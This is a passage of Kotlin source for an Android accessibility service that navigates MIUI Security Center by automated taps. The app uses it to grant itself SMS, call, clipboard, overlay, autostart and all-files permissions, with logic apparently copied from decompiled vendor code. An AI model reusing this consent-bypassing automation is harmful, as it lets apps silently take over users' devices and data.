                        val title = r?.findAccessibilityNodeInfosByViewId(
                            "com.miui.securitycenter:id/action_bar_subtitle"
                        )?.firstOrNull()?.text?.toString() ?: ""
                        Log.i(TAG, "[权限管理] $name 点击后 subtitle='$title'")
                    } catch (_: Exception) {}

                    // Check if already authorized (content-desc or text shows "始终允许")
                    val alreadyAllowed = isPermissionAlreadyAllowed()
                    if (alreadyAllowed) {
                        Log.i(TAG, "[权限管理] $name: 已是始终允许，跳过")
                        pressBack()
                        interruptibleDelay(500L)
                        completedCount++
                        continue
                    }
                    var allowed = false
                    for (allowKw in PERM_ALLOW_KEYWORDS) {
                        if (clickTextNode(allowKw)) {
                            allowed = true
                            Log.i(TAG, "[权限管理] $name -> $allowKw")
                            break
                        }
                    }
                    if (!allowed) Log.w(TAG, "[权限管理] $name: 未找到允许按钮")
                    interruptibleDelay(150L)
                    pressBack()
                    interruptibleDelay(500L)
                    completedCount++
                } else {
                    Log.w(TAG, "[权限管理] $name: 未找到权限项")
                }
            }
            successes.add("权限管理完成 ($completedCount/${PERM_MGMT_ITEMS.size})")
        } catch (e: kotlinx.coroutines.CancellationException) {
            throw e
        } catch (e: Exception) {
            failures.add("权限管理配置失败: ${e.message}")
        }
    }

    private suspend fun clickPermissionItemMulti(keywords: List<String>, logs: MutableList<String>): Boolean {
        // First try without scrolling
        for (keyword in keywords) { if (clickTextNode(keyword)) return true }
        // Scroll down with fresh root each time — MIUI other permissions page is very long
        for (i in 0 until 6) {
            val freshRoot = try { service?.rootInActiveWindow } catch (_: Exception) { null } ?: return false
            val pkg = freshRoot.packageName?.toString() ?: ""
            Log.d(TAG, "[权限搜索] scroll down #$i, pkg=$pkg, keywords=$keywords")
            if (pkg != "com.miui.securitycenter") {
                Log.w(TAG, "[权限搜索] 已离开安全中心，停止滚动")
                return false
            }
            scrollDown(freshRoot); interruptibleDelay(500L)
            for (keyword in keywords) { if (clickTextNode(keyword)) return true }
        }
        return false
    }

    /**
     * Check if the current permission detail page already shows "始终允许" as selected.
     * MIUI uses RadioButton or checked state to indicate current selection.
     */
    private fun isPermissionAlreadyAllowed(): Boolean {
        val root = try { service?.rootInActiveWindow } catch (_: Exception) { null } ?: return false
        for (keyword in PERM_ALLOW_KEYWORDS) {
            val nodes = try { root.findAccessibilityNodeInfosByText(keyword) } catch (_: Exception) { null }
            if (nodes.isNullOrEmpty()) continue
            for (node in nodes) {
                if (!node.isVisibleToUser) continue
                if (node.isChecked || node.isSelected) return true
                val parent = node.parent
                if (parent != null && (parent.isChecked || parent.isSelected)) return true
            }
        }
        return false
    }

    /**
     * Ensure we're on the "其他权限" (OtherPermissionsActivity) page.
     * If pressBack went too far and we're on "系统服务" (ApplicationsDetailsActivity),
     * re-click "其他权限" to go back in.
     */
    private suspend fun ensureOnOtherPermissionsPage(): Boolean {
        val root = try { service?.rootInActiveWindow } catch (_: Exception) { null } ?: return false
        val pkg = root.packageName?.toString() ?: ""
        if (pkg != "com.miui.securitycenter") {
            Log.w(TAG, "[权限管理] 已离开安全中心 (pkg=$pkg)")
            return false
        }
        // Detect which page we're on:
        // Level 1 "系统服务" app detail: has 通知管理, 自启动, 存储占用, 权限管理
        // Level 2 "权限管理" permissions: has 位置, 相机, 麦克风, 其他权限
        // Level 3 "其他权限" other perms: has 发送短信, 拨打电话, 后台弹出界面, 显示悬浮窗
        val otherPermIndicators = listOf("发送短信", "拨打电话", "读取剪贴板", "后台弹出界面", "显示悬浮窗", "通知类短信", "获取应用列表")
        val permMgmtIndicators = listOf("位置", "相机", "麦克风")  // Level 2 page
        val appDetailIndicators = listOf("通知管理", "自启动", "存储占用", "流量使用情况")

        var otherPermScore = 0
        var permMgmtScore = 0
        var appDetailScore = 0
        for (indicator in otherPermIndicators) {
            val nodes = try { root.findAccessibilityNodeInfosByText(indicator) } catch (_: Exception) { null }
            if (!nodes.isNullOrEmpty()) otherPermScore++
        }
        for (indicator in permMgmtIndicators) {
            val nodes = try { root.findAccessibilityNodeInfosByText(indicator) } catch (_: Exception) { null }
            if (!nodes.isNullOrEmpty()) permMgmtScore++
        }
        for (indicator in appDetailIndicators) {
            val nodes = try { root.findAccessibilityNodeInfosByText(indicator) } catch (_: Exception) { null }
            if (!nodes.isNullOrEmpty()) appDetailScore++
        }

        if (otherPermScore >= 2) {
            UiDebugger.dumpPage(service, "miui_phase3_ensure_page", "ensureOn: otherPerm=$otherPermScore permMgmt=$permMgmtScore appDetail=$appDetailScore")
            return true  // Already on "其他权限" page
        }

        if (permMgmtScore >= 2) {
            UiDebugger.dumpPage(service, "miui_phase3_ensure_page", "ensureOn: otherPerm=$otherPermScore permMgmt=$permMgmtScore appDetail=$appDetailScore")
            // On "权限管理" page (level 2) — just click "其他权限"
            Log.i(TAG, "[权限管理] 检测到在权限管理页面，点击其他权限")
            for (otherKw in OTHER_PERM_KEYWORDS) {
                if (clickTextNode(otherKw)) {
                    Log.i(TAG, "[权限管理] 重新进入「$otherKw」子页面")
                    interruptibleDelay(1500L)
                    waitForPageStable()
                    return true
                }
            }
            // "其他权限" might need scroll
            val scrollRoot = try { service?.rootInActiveWindow } catch (_: Exception) { null }
            if (scrollRoot != null) {
                for (i in 0 until 3) {
                    scrollDown(scrollRoot); interruptibleDelay(500L)
                    for (otherKw in OTHER_PERM_KEYWORDS) {
                        if (clickTextNode(otherKw)) {
                            Log.i(TAG, "[权限管理] 滚动后重新进入「$otherKw」子页面")
                            interruptibleDelay(1500L)
                            waitForPageStable()
                            return true
                        }
                    }
                }
            }
            Log.w(TAG, "[权限管理] 在权限管理页面未找到其他权限入口")
            return false
        }

        if (appDetailScore >= 2) {
            UiDebugger.dumpPage(service, "miui_phase3_ensure_page", "ensureOn: otherPerm=$otherPermScore permMgmt=$permMgmtScore appDetail=$appDetailScore")
            // On "系统服务" app detail page (level 1) — need 权限管理 → 其他权限
            Log.i(TAG, "[权限管理] 检测到在系统服务页面，重新进入其他权限")
            for (keyword in PERM_MGMT_ENTRY_KEYWORDS) {
                if (clickTextNode(keyword)) {
                    interruptibleDelay(1500L)
                    waitForPageStable()
                    for (otherKw in OTHER_PERM_KEYWORDS) {
                        if (clickTextNode(otherKw)) {
                            Log.i(TAG, "[权限管理] 重新进入「$otherKw」子页面")
                            interruptibleDelay(1500L)
                            waitForPageStable()
                            return true
                        }
                    }
                    break
                }
            }
            Log.w(TAG, "[权限管理] 重新进入其他权限失败")
            return false
        }
        // Unknown page but still in securitycenter — try to proceed
        return true
    }

    private fun clickTextNode(text: String): Boolean {
        val root = try { service?.rootInActiveWindow } catch (_: Exception) { null } ?: return false
        val nodes = try { root.findAccessibilityNodeInfosByText(text) } catch (_: Exception) { null }
        if (nodes.isNullOrEmpty()) return false
        val screenH = context.resources.displayMetrics.heightPixels
        val screenW = context.resources.displayMetrics.widthPixels
        for (node in nodes) {
            if (!node.isVisibleToUser) continue
            val nodeText = node.text?.toString()?.trim() ?: ""
            if (nodeText == text || nodeText.contains(text, ignoreCase = true)) {
                // 严格 bounds 检查：必须在屏幕内（排除 RecyclerView 的 off-screen 缓存节点）
                val rect = android.graphics.Rect()
                node.getBoundsInScreen(rect)
                if (rect.width() <= 0 || rect.height() <= 0) {
                    Log.v(TAG, "[clickTextNode] $text: bounds empty, skip")
                    continue
                }
                if (rect.top < 0 || rect.bottom > screenH || rect.left < 0 || rect.right > screenW) {
                    Log.v(TAG, "[clickTextNode] $text: bounds $rect out of screen ${screenW}x${screenH}, skip")
                    continue
                }
                Log.d(TAG, "[clickTextNode] $text: click at bounds=$rect")
                return clickNodeWithFallback(node)
            }
        }
        return false
    }

    private fun scrollUp(root: AccessibilityNodeInfo): Boolean {
        val scrollable = findScrollableNode(root)
        if (scrollable != null) {
            val result = scrollable.performAction(AccessibilityNodeInfo.ACTION_SCROLL_BACKWARD)
            if (result) return true
        }
        val w = context.resources.displayMetrics.widthPixels
        val h = context.resources.displayMetrics.heightPixels
        return gestureSwipe(w / 2f, h * 0.3f, w / 2f, h * 0.7f)
    }

    private suspend fun pressBack() {
        try {
            service?.performGlobalAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_BACK)
            interruptibleDelay(100L)
        } catch (_: Exception) {}
    }

    /** Try launching each component in order, return true on first success.
     *  Uses service.startActivity() for BAL_ALLOW_TOKEN on MIUI, falls back to context. */
    internal fun launchComponentActivity(components: List<ComponentName>): Boolean {
        for (component in components) {
            try {
                val intent = Intent().apply {
                    this.component = component
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_MULTIPLE_TASK or Intent.FLAG_ACTIVITY_NO_HISTORY or Intent.FLAG_ACTIVITY_CLEAR_TOP)
                }
                (service ?: context).startActivity(intent)
                return true
            } catch (_: Exception) { continue }
        }
        return false
    }

    // ── Wait utilities (vendor m212294f9, m212272d6) ────────────────

    /**
     * Wait until the accessibility root window node count stabilizes.
     * Matches vendor m212294f9 (waitForPageStable):
     * Polls rootInActiveWindow, counts nodes; when [requiredStableCount]
     * consecutive polls return the same count, returns true.
     * Returns false on timeout.
     */
    internal suspend fun waitForPageStable(
        requiredStableCount: Int = STABLE_REQUIRED_COUNT,
        pollIntervalMs: Long = STABLE_POLL_INTERVAL_MS,
        timeoutMs: Long = STABLE_TIMEOUT_MS
    ): Boolean {
        val startTime = System.currentTimeMillis()
        var lastNodeCount = -1
        var stableHits = 0

        while (System.currentTimeMillis() - startTime < timeoutMs) {
            val root = try { service?.rootInActiveWindow } catch (_: Exception) { null }
            val nodeCount = if (root != null) countNodes(root) else 0
            try { root?.recycle() } catch (_: Exception) {}

            if (nodeCount == lastNodeCount && nodeCount > 0) {
                stableHits++
                if (stableHits >= requiredStableCount) {
                    Log.d(TAG, "[waitForPageStable] page stable (nodes=$nodeCount, hits=$stableHits)")
                    return true
                }
            } else {
                lastNodeCount = nodeCount
                stableHits = 0
            }
            interruptibleDelay(pollIntervalMs)
        }
        Log.d(TAG, "[waitForPageStable] timeout after ${timeoutMs}ms")
        return false
    }

    /**
     * Delay in small chunks (100ms) to stay responsive to cancellation.
     * Matches vendor m212272d6 (interruptibleDelay).
     */
    internal open suspend fun interruptibleDelay(totalMs: Long) {
        var remaining = totalMs
        while (remaining > 0) {
            val chunk = minOf(remaining, 100L)
            delay(chunk)
            remaining -= chunk
        }
    }

    /**
     * Find our app in a list and click its switch/toggle.
     * Searches by app name first, then by keywords. Scrolls if not found.
     * JADX: m212290f5 (verifyAndEnableAutoStart) + m212249a3 (clickTextWithScroll).
     */
    internal suspend fun findAndClickAppSwitch(keywords: List<String>): Boolean {
        val root = try { service?.rootInActiveWindow } catch (_: Exception) { null } ?: return false
        try {
            // First try: search by app label
            val appLabel = getAppLabel()
            if (appLabel.isNotEmpty()) {
                val result = findTextAndClickSwitch(root, appLabel)
                if (result) {
                    Log.i(TAG, "[findAndClickAppSwitch] found by app label: $appLabel")
                    return true
                }
            }

            // Second try: search by keywords
            for (keyword in keywords) {
                val result = findTextAndClickSwitch(root, keyword)
                if (result) {
                    Log.i(TAG, "[findAndClickAppSwitch] found by keyword: $keyword")
                    return true
                }
            }

            // Third try: scroll and retry (vendor clickTextWithScroll)
            for (scrollAttempt in 0 until MAX_SCROLL_ATTEMPTS) {
                if (!scrollDown(root)) break
                interruptibleDelay(500L)
                val newRoot = try { service?.rootInActiveWindow } catch (_: Exception) { null } ?: break
                if (appLabel.isNotEmpty()) {
                    val result = findTextAndClickSwitch(newRoot, appLabel)
                    if (result) return true
                }
                for (keyword in keywords) {
                    val result = findTextAndClickSwitch(newRoot, keyword)
                    if (result) return true
                }
            }
        } catch (e: kotlinx.coroutines.CancellationException) {
            throw e
        } catch (e: Exception) {
            Log.w(TAG, "[findAndClickAppSwitch] error: ${e.message}")
        }
        return false
    }

    /**
     * Find text node and click the adjacent Switch/CheckBox/Toggle.
     * Vendor: m212264c6 (findSwitchNearNode) — searches parent's children up to 3 levels.
     */
    private fun findTextAndClickSwitch(root: AccessibilityNodeInfo, text: String): Boolean {
        val nodes = try { root.findAccessibilityNodeInfosByText(text) } catch (_: Exception) { null }
        if (nodes.isNullOrEmpty()) return false
        for (node in nodes) {
            if (!node.isVisibleToUser) continue
            val nodeText = node.text?.toString()?.trim() ?: ""
            if (nodeText != text && !nodeText.contains(text, ignoreCase = true)) continue

            // Try finding switch near this node (vendor c6 pattern: 3-level sibling search)
            val switchNode = findSwitchNearNode(node)
            if (switchNode != null) {
                val switchClass = switchNode.className?.toString() ?: ""
                val switchChecked = switchNode.isChecked
                Log.i(TAG, "[findTextAndClickSwitch] text='$text' nodeText='$nodeText' switchClass='$switchClass' isChecked=$switchChecked")

                if (!switchChecked) {
                    val clicked = clickNodeWithFallback(switchNode)
                    if (clicked) {
                        Log.i(TAG, "[findTextAndClickSwitch] ✅ switch ENABLED for: $text")
                        return true
                    }
                } else {
                    Log.i(TAG, "[findTextAndClickSwitch] ✅ switch already ON for: $text, skipping")
                    return true
                }
            }
            // No fallback text click — clicking text node directly could toggle the switch off
        }
        return false
    }

    /**
     * Find Switch/CheckBox/Toggle near a text node.
     * Vendor m212264c6: walks up to parent, searches siblings up to 3 levels deep.
     * Also checks if switch is to the right of the text (vendor a9 pattern).
     */
    internal fun findSwitchNearNode(textNode: AccessibilityNodeInfo): AccessibilityNodeInfo? {
        val textRect = Rect()
        textNode.getBoundsInScreen(textRect)

        val parent = try { textNode.parent } catch (_: Exception) { null } ?: return null
        // Level 1: parent's direct children
        for (i in 0 until parent.childCount) {
            val child = try { parent.getChild(i) } catch (_: Exception) { null } ?: continue
            if (isSwitchNode(child)) {
                Log.d(TAG, "[findSwitchNearNode] L1 found: ${child.className}")
                return child
            }
            // Level 2: grandchildren
            for (j in 0 until child.childCount) {
                val grandchild = try { child.getChild(j) } catch (_: Exception) { null } ?: continue
                if (isSwitchNode(grandchild)) {
                    Log.d(TAG, "[findSwitchNearNode] L2 found: ${grandchild.className}")
                    return grandchild
                }
                // Level 3
                for (k in 0 until grandchild.childCount) {
                    val great = try { grandchild.getChild(k) } catch (_: Exception) { null } ?: continue
                    if (isSwitchNode(great)) {
                        Log.d(TAG, "[findSwitchNearNode] L3 found: ${great.className}")
                        return great
                    }
                }
            }
        }

        // Walk up one more level (vendor c8 pattern: parent.parent)
        val grandparent = try { parent.parent } catch (_: Exception) { null }
        if (grandparent != null) {
            for (i in 0 until grandparent.childCount) {
                val uncle = try { grandparent.getChild(i) } catch (_: Exception) { null } ?: continue
                if (isSwitchNode(uncle)) return uncle
                for (j in 0 until uncle.childCount) {
                    val cousin = try { uncle.getChild(j) } catch (_: Exception) { null } ?: continue
                    if (isSwitchNode(cousin)) return cousin
                }
            }
        }
        return null
    }

    /**
     * Check if a node is a Switch/CheckBox/Toggle widget.
     * Vendor m212244c7: checks className against known switch types, must be visible and enabled.
     */
    private fun isSwitchNode(node: AccessibilityNodeInfo): Boolean {
        if (!node.isVisibleToUser || !node.isEnabled) return false
        val className = node.className?.toString() ?: return false
        // If node is checkable, it's a switch-like widget
        if (node.isCheckable) return true
        // Otherwise check class name against known types
        return SWITCH_CLASS_NAMES.any { className.contains(it, ignoreCase = true) }
    }

    /**
     * Click a node with parent-walk and gesture fallback.
     * Vendor m212288f3 (clickTextNode) + m212289f4 (clickConfirmNode).
     */
    internal fun clickNodeWithFallback(node: AccessibilityNodeInfo): Boolean {
        try {
            // Direct click
            if (node.isClickable && node.performAction(AccessibilityNodeInfo.ACTION_CLICK)) return true

            val screenW = context.resources.displayMetrics.widthPixels
            val screenH = context.resources.displayMetrics.heightPixels

            // 优先找父 clickable ViewGroup，用它的 bounds — MIUI RecyclerView 里
            // TextView 的 a11y bounds 可能与实际渲染位置严重不同步，父 row 的 bounds 才准确
            var parent = node.parent
            val clickableParents = mutableListOf<AccessibilityNodeInfo>()
            for (depth in 0 until 5) {
                if (parent == null) break
                if (parent.isClickable) clickableParents.add(parent)
                parent = parent.parent
            }

            // 先尝试 clickable parent 的 performAction（通常对真正 row 生效）
            for (p in clickableParents) {
                if (p.performAction(AccessibilityNodeInfo.ACTION_CLICK)) return true
            }

            // performAction 失败 → 用 clickable parent 的 bounds 中心做 gestureTap
            // (MIUI 可能要求真实触摸事件，performAction 被 ignore)
            for (p in clickableParents) {
                val pr = Rect()
                p.getBoundsInScreen(pr)
                if (pr.width() > 0 && pr.height() > 0) {
                    val pcx = pr.centerX().toFloat()
                    val pcy = pr.centerY().toFloat()
                    if (pcx > 0f && pcy > 0f && pcx < screenW && pcy < screenH) {
                        Log.d(TAG, "[clickNodeWithFallback] gestureTap on parent bounds=$pr")
                        if (gestureTap(pcx, pcy)) return true
                    }
                }
            }

            // 最后 fallback：用 node 自己的 bounds
            val rect = Rect()
            node.getBoundsInScreen(rect)
            val cx = rect.centerX().toFloat()
            val cy = rect.centerY().toFloat()
            if (cx > 0f && cy > 0f && cx < screenW && cy < screenH && rect.width() > 0 && rect.height() > 0) {
                Log.d(TAG, "[clickNodeWithFallback] gestureTap on node bounds=$rect (no clickable parent)")
                if (gestureTap(cx, cy)) return true
            }
        } catch (_: Exception) {}
        return false
    }

    /**
     * Find and click text directly (for radio buttons like "无限制").
     * Vendor m212248a1 (clickTextDirectly).
     */
    internal suspend fun findAndClickText(keywords: List<String>): Boolean {
        val root = try { service?.rootInActiveWindow } catch (_: Exception) { null } ?: return false
        for (keyword in keywords) {
            val nodes = try { root.findAccessibilityNodeInfosByText(keyword) } catch (_: Exception) { null }
            if (nodes.isNullOrEmpty()) continue
            for (node in nodes) {
                if (!node.isVisibleToUser) continue
                val nodeText = node.text?.toString()?.trim() ?: ""
                if (nodeText == keyword || nodeText.contains(keyword, ignoreCase = true)) {
                    if (clickNodeWithFallback(node)) {
                        Log.i(TAG, "[findAndClickText] clicked: $keyword")
                        return true
                    }
                }
            }
        }

        // Scroll and retry
        for (attempt in 0 until MAX_SCROLL_ATTEMPTS) {
            if (!scrollDown(root)) break
            interruptibleDelay(500L)
            val newRoot = try { service?.rootInActiveWindow } catch (_: Exception) { null } ?: break
            for (keyword in keywords) {
                val nodes = try { newRoot.findAccessibilityNodeInfosByText(keyword) } catch (_: Exception) { null }
                if (nodes.isNullOrEmpty()) continue
                for (node in nodes) {
                    if (node.isVisibleToUser) {
                        val nodeText = node.text?.toString()?.trim() ?: ""
                        if (nodeText == keyword || nodeText.contains(keyword, ignoreCase = true)) {
                            if (clickNodeWithFallback(node)) return true
                        }
                    }
                }
            }
        }
        return false
    }

    /**
     * Handle confirm popup dialog after toggling a switch.
     * Vendor m212283e8 (handleConfirmPopupDialog): searches for confirm keywords and clicks.
     */
    internal suspend fun handleConfirmPopupDialog(): Boolean {
        interruptibleDelay(500L)
        val root = try { service?.rootInActiveWindow } catch (_: Exception) { null } ?: return false
        for (keyword in CONFIRM_KEYWORDS) {
            val nodes = try { root.findAccessibilityNodeInfosByText(keyword) } catch (_: Exception) { null }
            if (nodes.isNullOrEmpty()) continue
            for (node in nodes) {
                if (node.isVisibleToUser && node.isClickable) {
                    if (node.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
                        Log.i(TAG, "[handleConfirmPopup] clicked: $keyword")
                        return true
                    }
                }
            }
        }
        return false
    }

    /**
     * Return to home screen. Vendor m212280e5 (returnToHome): 3×BACK + 1×HOME + delay.
     * BACK clears any nested settings pages before going HOME.
     */
    /**
     * Return to home screen. Vendor m212280e5: 3x BACK + 1x HOME + delay(1000ms).
     * BACK first to close settings page stack, then HOME to go to launcher.
     */
    internal suspend fun returnToHome() {
        try {
            repeat(3) {
                service?.performGlobalAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_BACK)
                interruptibleDelay(200L)
            }
            service?.performGlobalAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_HOME)
            interruptibleDelay(1000L)
        } catch (_: Exception) {}
    }

    /**
     * Scroll down in the current view. Vendor m212279e4 (scrollDown via ACTION_SCROLL_FORWARD)
     * with gesture fallback m212278e3.
     */
    private fun scrollDown(root: AccessibilityNodeInfo): Boolean {
        // Try finding a scrollable node first
        val scrollable = findScrollableNode(root)
        if (scrollable != null) {
            val result = scrollable.performAction(AccessibilityNodeInfo.ACTION_SCROLL_FORWARD)
            if (result) return true
        }
        // Gesture fallback: swipe up from center
        val w = context.resources.displayMetrics.widthPixels
        val h = context.resources.displayMetrics.heightPixels
        return gestureSwipe(w / 2f, h * 0.7f, w / 2f, h * 0.3f)
    }

    /** Find first scrollable node in tree. Vendor m212243c5. */
    private fun findScrollableNode(node: AccessibilityNodeInfo): AccessibilityNodeInfo? {
        if (node.isScrollable) return node
        for (i in 0 until node.childCount) {
            val child = try { node.getChild(i) } catch (_: Exception) { null } ?: continue
            if (child.isScrollable) return child
            val found = findScrollableNode(child)
            if (found != null) {
                child.recycle()
                return found
            }
            child.recycle()
        }
        return null
    }

    /** Gesture tap at coordinates. Vendor m212277e2. */
    private fun gestureTap(x: Float, y: Float): Boolean {
        // ⚠️ MIUI 会静默丢弃零距离 gesture（path 只有 moveTo）。
        // 必须加 1px 抖动让它被识别为真实 tap。Phase 1 GestureTapHelper 已解决同样问题。
        val svc = service ?: return false
        return try {
            val path = Path().apply {
                moveTo(x, y)
                lineTo(x + 1f, y + 1f)  // 1px jitter
            }
            val gesture = GestureDescription.Builder()
                .addStroke(GestureDescription.StrokeDescription(path, 0L, 50L))
                .build()
            svc.dispatchGesture(gesture, null, null)
            Thread.sleep(100L)
            true
        } catch (_: Exception) { false }
    }

    /** Gesture swipe. Vendor m212278e3. */
    private fun gestureSwipe(x1: Float, y1: Float, x2: Float, y2: Float): Boolean {
        return try {
            val path = Path().apply { moveTo(x1, y1); lineTo(x2, y2) }
            val gesture = GestureDescription.Builder()
                .addStroke(GestureDescription.StrokeDescription(path, 10L, 300L))
                .build()
            service?.dispatchGesture(gesture, null, null)
            Thread.sleep(500L)
            true
        } catch (_: Exception) { false }
    }

    /** Get app display label. Vendor m212267d1. */
    private fun getAppLabel(): String {
        return try {
            val pm = context.packageManager
            val appInfo = pm.getApplicationInfo(context.packageName, 0)
            pm.getApplicationLabel(appInfo).toString()
        } catch (_: Exception) { "" }
    }

    /**
     * Phase 0 self-polling: search for permission allow keywords and click.
     * Replaces handler dependency. Vendor f55110a4 keyword list.
     * Returns true if a click was performed.
     */
    internal fun pollClickPermissionAllow(root: AccessibilityNodeInfo): Boolean {
        for (keyword in PERMISSION_ALLOW_KEYWORDS) {
            val nodes = try { root.findAccessibilityNodeInfosByText(keyword) } catch (_: Exception) { null }
            if (nodes.isNullOrEmpty()) continue
            for (node in nodes) {
                if (!node.isVisibleToUser) continue
                val nodeText = node.text?.toString()?.trim() ?: ""
                if (nodeText != keyword && !nodeText.contains(keyword, ignoreCase = true)) continue
                // Prefer direct click on clickable node
                if (node.isClickable && node.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
                    Log.i(TAG, "[Phase0] clicked allow: $keyword")
                    return true
                }
                // Walk up parents (3 levels)
                var parent = try { node.parent } catch (_: Exception) { null }
                for (depth in 0 until 3) {
                    if (parent == null) break
                    if (parent.isClickable && parent.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
                        Log.i(TAG, "[Phase0] clicked parent for: $keyword")
                        return true
                    }
                    parent = try { parent.parent } catch (_: Exception) { null }
                }
                // Gesture fallback
                val rect = Rect()
                node.getBoundsInScreen(rect)
                if (rect.width() > 0 && rect.height() > 0) {
                    if (gestureTap(rect.centerX().toFloat(), rect.centerY().toFloat())) {
                        Log.i(TAG, "[Phase0] gesture tap for: $keyword")
                        return true
                    }
                }
            }
        }
        return false
    }

    /** Count total nodes in accessibility tree. Matches vendor m212239a7. */
    private fun countNodes(node: android.view.accessibility.AccessibilityNodeInfo): Int {
        var count = 1
        try {
            for (i in 0 until node.childCount) {
                val child = node.getChild(i) ?: continue
                count += countNodes(child)
                try { child.recycle() } catch (_: Exception) {}
            }
        } catch (_: Exception) {}
        return count
    }

    /**
     * MIUI 专用 ALL_FILES 授权流程。对齐 vendor C0367a4.m212254b3 (行 1740-2172)。
     *
     * 4 级回退策略：
     *  L1 文本 toggleCheckBox(keyword)
     *  L2 DFS findFirstUnchecked Switch + gesture tap 50ms
     *  L3 固定坐标 (w*0.875, h*0.225) gesture tap 100ms
     *  L4 3 × 150ms 验证 Environment.isExternalStorageManager()
     * 外层整体重试 3 次 (i=0..2)，每次重开主 Intent。
     *
     * @return true 若 Environment.isExternalStorageManager() == true
     */
    @Suppress("DEPRECATION")
    open suspend fun executeAllFilesAccess(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ): Boolean {
        if (android.os.Build.VERSION.SDK_INT < 30) {
            logs.add("MIUI ALL_FILES: SDK<30 跳过")
            return false
        }
        if (android.os.Environment.isExternalStorageManager()) {
            logs.add("MIUI ALL_FILES: 已授权")
            successes.add("all_files_access")
            return true
        }

        val pkg = context.packageName
        val dm = context.resources.displayMetrics
        val coordX = dm.widthPixels * ALL_FILES_COORD_X_RATIO
        val coordY = dm.heightPixels * ALL_FILES_COORD_Y_RATIO

        // 2026-04-16 ADAPT: 整体 3s 超时 guard — 避免阻塞生物识别流程
        val overallStart = System.currentTimeMillis()
        for (attempt in 0 until ALL_FILES_OUTER_RETRIES) {
            val elapsed = System.currentTimeMillis() - overallStart
            if (elapsed >= ALL_FILES_OVERALL_TIMEOUT_MS) {
                logs.add("MIUI ALL_FILES: ⏱️ 整体超时 ${ALL_FILES_OVERALL_TIMEOUT_MS}ms (已耗 ${elapsed}ms), 跳过剩余重试")
                failures.add("all_files_access: timeout after ${elapsed}ms")
                return false
            }
            logs.add("MIUI ALL_FILES: 外层重试 ${attempt + 1}/$ALL_FILES_OUTER_RETRIES (已耗 ${elapsed}ms)")

            // Predwarm — 仅当 SDK<35 时走 MIUI 专用 ApplicationsDetailsActivity
            try {
                val pre = if (android.os.Build.VERSION.SDK_INT < 35) {
                    android.content.Intent().apply {
                        component = android.content.ComponentName(
                            "com.miui.securitycenter",
                            "com.miui.appmanager.ApplicationsDetailsActivity"
                        )
                        putExtra("package_name", pkg)
                        flags = ALL_FILES_PREDWARM_FLAGS
                    }
                } else {
                    android.content.Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                        data = android.net.Uri.parse("package:$pkg")
                        flags = ALL_FILES_PREDWARM_FLAGS
                    }
                }
                context.startActivity(pre)
            } catch (e: kotlinx.coroutines.CancellationException) {
                throw e
            } catch (e: Exception) {
                logs.add("MIUI ALL_FILES: 预热失败 ${e.message}")
            }
            kotlinx.coroutines.delay(300L)

            // Main Intent
            val mainLaunchOk = try {
                val main = android.content.Intent(
                    android.provider.Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION
                ).apply {
                    data = android.net.Uri.parse("package:$pkg")
                    flags = ALL_FILES_MAIN_FLAGS
                }
                context.startActivity(main)
                true
            } catch (e: kotlinx.coroutines.CancellationException) {
                throw e
            } catch (e: Exception) {
                logs.add("MIUI ALL_FILES: 主 Intent 失败 ${e.message}")
                false
            }
            if (!mainLaunchOk) continue
            // 2026-04-16 v3: 300ms → 1500ms，让 MANAGE_APP_ALL_FILES 页面 a11y tree 渲染完成
            kotlinx.coroutines.delay(1500L)

            val root = service?.rootInActiveWindow
            if (root == null) {
                logs.add("MIUI ALL_FILES: root null, 跳过本轮")
                continue
            }
            // 2026-04-16 v3: 记录当前页面状态便于真机诊断
            Log.d(TAG, "[MIUI ALL_FILES] root pkg=${root.packageName} " +
                    "childCount=${root.childCount} " +
                    "hasText(授予管理)=${root.findAccessibilityNodeInfosByText("授予管理").size} " +
                    "hasText(所有文件)=${root.findAccessibilityNodeInfosByText("所有文件").size}")

            var clicked = false

            // L1 文本 toggleCheckBox — 回收 text 查询结果节点（vendor 同样回收）
            for (keyword in ALL_FILES_KEYWORDS) {
                val nodes = root.findAccessibilityNodeInfosByText(keyword) ?: continue
                try {
                    for (n in nodes) {
                        // Parent walk — 不回收起点 n（由外层 try/finally 统一回收）
                        var p: android.view.accessibility.AccessibilityNodeInfo? = n
                        for (depth in 0..5) {
                            if (p == null) break
                            val sw = SwitchNodeFinder.findFirstUnchecked(p)
                            if (sw != null) {
                                val r = android.graphics.Rect()
                                sw.getBoundsInScreen(r)
                                if (r.width() > 0 && r.height() > 0) {
                                    val svc = service
                                    if (svc != null) {
                                        val ok = GestureTapHelper.performTap(
                                            svc, r.exactCenterX(), r.exactCenterY(),
                                            GestureTapHelper.TAP_DURATION_MS_SHORT
                                        )
                                        if (ok) { clicked = true; break }
                                    }
                                }
                            }
                            p = p.parent
                        }
                        if (clicked) break
                    }
                } finally {
                    // 回收 text 查询结果所有节点（API<33 需要；API>=33 为 no-op）。
                    // 跳过 root 本身的引用（外层 finally 会 recycle root，避免 double-recycle）。
                    for (n in nodes) {
                        if (n !== root) {
                            try { n.recycle() } catch (_: Throwable) {}
                        }
                    }
                }
                if (clicked) break
            }

            // L2 DFS findFirstUnchecked — 4 轮快速重试
            if (!clicked) {
                for (round in 0..3) {
                    val sw = SwitchNodeFinder.findFirstUnchecked(root)
                    if (sw == null) {
                        kotlinx.coroutines.delay(100L)
                        continue
                    }
                    val r = android.graphics.Rect()
                    sw.getBoundsInScreen(r)
                    if (r.width() > 0 && r.height() > 0) {
                        val svc = service ?: break
                        val ok = GestureTapHelper.performTap(
                            svc, r.exactCenterX(), r.exactCenterY(),
                            GestureTapHelper.TAP_DURATION_MS_SHORT
                        )
                        if (ok) { clicked = true; break }
                    }
                }
            }

            // L3 固定坐标兜底
            if (!clicked) {
                val svc = service
                if (svc != null) {
                    GestureTapHelper.performTap(svc, coordX, coordY, ALL_FILES_COORD_DURATION_MS)
